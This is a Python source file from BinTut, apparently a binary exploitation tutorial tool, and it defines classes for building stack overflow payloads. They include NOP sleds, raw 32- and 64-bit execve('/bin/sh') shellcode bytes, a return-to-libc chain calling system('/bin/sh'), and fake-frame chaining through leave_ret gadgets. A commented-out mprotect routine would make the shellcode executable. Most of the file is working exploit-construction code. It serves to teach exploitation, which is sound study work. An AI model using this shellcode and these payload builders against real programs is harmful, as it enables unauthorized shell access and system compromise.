"""
Copyright 2016 Gu Zhengxiong <rectigu@gmail.com>

This file is part of BinTut.

BinTut is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

BinTut is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with BinTut.  If not, see <http://www.gnu.org/licenses/>.
"""


from __future__ import division, absolute_import, print_function

from .init import red
from .helpers import Addr, get_size_of_pointer
from .utils import p32


# /usr/include/asm-generic/mman-common.h
# #define PROT_READ	0x1		/* page can be read */
# #define PROT_WRITE	0x2		/* page can be written */
# #define PROT_EXEC	0x4		/* page can be executed */

# PROT_READ = 0x1
# PROT_WRITE = 0x2
# PROT_EXEC = 0x4
# PROT_RWX = PROT_READ | PROT_WRITE | PROT_EXEC


# def mprotect(offset, addr):
#     # TODO: Support adding shellcode.
#     shellcode = Shellcode()
#     size_of_pointer = get_size_of_pointer()
#     sc_addr = hex(int(addr, 16) + 2*size_of_pointer)
#     frames = (
#         Faked(offset=offset, address=addr) + shellcode +
#         Faked('mprotect',
#               [align_to_page(sc_addr), 4096, PROT_RWX]) +
#         Faked(next_address=sc_addr))
#     print(red(sc_addr))
#     return frames.payload


# TODO: Use other methods.
class LoggingMixin(object):
    def __init__(self):
        from logging import getLogger
        self.logger = getLogger(self.__class__.__name__)


# TODO: Use other friendly and consistent libraries.
class Environment(LoggingMixin):
    PLATFORM = None
    # TODO: Substitute ``BITS`` with ``ABI``.
    BITS = None
    POINTER_SIZE = None

    def __init__(self, platform=None, bits=None, pointer_size=None):
        LoggingMixin.__init__(self)

        if platform is None:
            from sys import platform
        self.__class__.PLATFORM = platform
        self.logger.debug('platform: %s', platform)

        if bits is None:
            bits = 32
        self.__class__.BITS = bits
        self.logger.debug('bits: %s', bits)

        if pointer_size is None:
            pointer_size = 4 if bits == 32 else 8
        self.__class__.POINTER_SIZE = pointer_size
        self.logger.debug('pointer_size: %s', pointer_size)


class Payload(Environment, LoggingMixin):
    def __init__(self, payload=None):
        LoggingMixin.__init__(self)

        if payload is None:
            payload = b''
        self.payload = payload

    def compose(self):
        return self.payload

    def __add__(self, other):
        self.logger.debug('self.__class__: %s', self.__class__)
        return self.__class__(self.compose() + other.compose())


class Fill(Payload, LoggingMixin):
    def __init__(self, count, byte=b'A'):
        LoggingMixin.__init__(self)

        self.count = count
        self.byte = byte

    def compose(self):
        return self.count * self.byte

    # TODO: Strive to remove this.
    def __add__(self, other):
        return Payload(self.compose() + other.compose())


class Plain(Payload, LoggingMixin):
    def __init__(self, address):
        LoggingMixin.__init__(self)

        self.address = address

    def compose(self):
        return p32(self.address)


class Nop(Fill, LoggingMixin):
    def __init__(self, count):
        Fill.__init__(self, count, b'\x90')


# TODO: Rely on other libraries.
class Shellcode(Payload, LoggingMixin):
    def __init__(self):
        LoggingMixin.__init__(self)

        self.logger.debug('PLATFORM: %s', self.PLATFORM)
        self.logger.debug('BITS: %s', self.BITS)
        self.logger.debug('POINTER_SIZE: %s', self.POINTER_SIZE)

        self.sc32 = b"\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f" \
                    b"\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd" \
                    b"\x80"
        self.sc64 = b"\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f" \
                    b"\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31" \
                    b"\xd2\x0f\x05"

    def compose(self):
        return self.sc32 if self.BITS == 32 else self.sc64


class Ret2Fun(Payload, LoggingMixin):
    def compose(self):
        system = Addr('system', self.BITS)
        binsh = Addr('/bin/sh', self.BITS)
        exit_addr = Addr('exit', self.BITS)
        exit_code = b'\x00' * self.POINTER_SIZE
        return p32(system) + p32(exit_addr) + p32(binsh) + exit_code


class Faked(Payload, LoggingMixin):
    """A faked frame.

    Three valid use cases are as follows:
    Faked(name, args) is a normal frame,
    Faked(offset=offset, address=address) the starting frame, and
    Faked(address=address, payload=payload) the resulting frame.
    """
    filling_byte = b'A'

    def __init__(self, name=None, args=None, offset=None,
                 address=None, payload=None, next_address=None):
        LoggingMixin.__init__(self)

        self.offset = offset
        self.address = address
        self.name = name

        if args is None:
            self.args = []
        else:
            self.args = args

        if self.offset:
            # Construct the starting faked frame.
            self.payload = (
                self.filling_byte*(offset-self.POINTER_SIZE) +
                p32(self.address) +
                p32(Addr('leave_ret')))
        else:
            self.payload = payload

        self.next_address = next_address

    def __add__(self, other):
        """Combine two faked frames.

        Expected left operands should be either
        the starting faked frame or resulting frames constructed by
        a previous combination, while right operands a normal frame.
        """
        if isinstance(other, Shellcode):
            # TODO: Support adding shellcode.
            address = hex(int(self.address, 16) + len(other.sc))
            payload = (
                self.filling_byte*(
                    self.offset-self.POINTER_SIZE) +
                p32(address) + p32(Addr('leave_ret')) + other.sc)
        elif other.next_address:
            address = other.next_address
            payload = (
                self.payload + p32(address) + p32(address) +
                p32(Addr('leave_ret')))
        else:
            address = hex((int(self.address, 16) +
                           3*self.POINTER_SIZE +
                           len(other.args)*self.POINTER_SIZE))
            payload = (self.payload +
                       p32(address) + p32(Addr(other.name)) +
                       p32(Addr('leave_ret')) + other.make_args())
        # Construct a resulting frame.
        return self.__class__(address=address, payload=payload)

    def make_args(self):
        """Prepare stack arguments for the function in the frame.

        For the time being, it handles strings and integrals.
        """
        args = b''
        for arg in self.args:
            if isinstance(arg, int):
                args += p32('{:#010x}'.format(arg))
            elif isinstance(arg, str):
                args += p32(Addr(arg))
            else:
                raise ValueError
        return args
